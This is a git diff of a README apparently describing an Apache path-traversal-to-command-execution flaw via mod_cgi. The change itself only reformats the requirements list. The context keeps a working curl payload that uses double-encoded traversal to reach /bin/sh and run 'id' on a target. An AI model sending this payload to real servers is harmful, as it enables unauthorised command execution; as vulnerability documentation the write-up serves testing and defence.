@@ -134,9 +134,9 @@ Path traversal only work from a mapped URI (e.g. via "Alias" or "ScriptAlias" Ap
 Besides, ScriptAlias marks as Exec (for Apache) all the contents for the given directory (regardless the file extensions).
 
 ### Requirements:
-1/ mod_cgi enabled (not default but easy)\
-2/ target binary should be +x (default for /bin/sh)\
-3/ apache permissions granted for /bin or / (not default and difficult/unrealistic)\
+1. mod_cgi enabled (not default but easy)\
+2. target binary should be +x (default for /bin/sh)\
+3. apache permissions granted for /bin or / (not default and difficult/unrealistic)\
 
 ### Check if server is vulnerable:
 `curl 'http://IPADDR/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; id'`
